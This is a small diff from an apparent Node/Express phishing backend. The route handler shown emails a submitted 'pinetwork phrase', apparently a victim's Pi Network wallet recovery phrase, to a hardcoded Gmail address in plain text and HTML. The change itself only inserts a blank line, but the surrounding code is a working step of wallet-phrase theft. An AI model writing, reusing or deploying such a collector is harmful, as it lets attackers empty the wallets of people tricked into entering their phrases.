@@ -60,6 +60,7 @@ app.post("/submit/7668", async (req, res) => {
         to: ["pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
+        
         html: `<h1>${mfText}</h1>`,
       }
       );
